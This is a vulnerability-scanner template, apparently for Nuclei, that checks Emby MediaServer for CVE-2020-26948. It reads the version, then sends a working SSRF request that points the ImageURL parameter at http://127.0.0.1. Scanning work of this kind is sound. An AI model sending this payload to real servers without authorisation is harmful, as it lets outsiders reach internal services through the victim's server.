id: cve-2020-26948

info:
  name: Emby MediaServer RemoteSearch SSRF
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Emby Server before 4.5.0 allows SSRF via the Items/RemoteSearch/Image ImageURL parameter.
  reference:
    - https://github.com/btnz-k/emby_ssrf
  classification:
    cve-id: CVE-2020-26948

variables:
  check_uri: "/System/Info/Public"
  ssrf_uri: "/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://127.0.0.1"

flow: |
  http(1) && http(2)

http:
  - id: version-check
    method: GET
    path:
      - "{{BaseURL}}{{check_uri}}"
    headers:
      Accept: application/json
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: body
        regex:
          - '"Version"\s?:\s?"([^"]+)"'
    extractors:
      - type: regex
        name: version
        part: body
        internal: true
        regex:
          - '"Version"\s?:\s?"([^"]+)"'
        group: 1

  - id: ssrf-check
    method: GET
    path:
      - "{{BaseURL}}{{ssrf_uri}}"
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - "touchicon114.png"
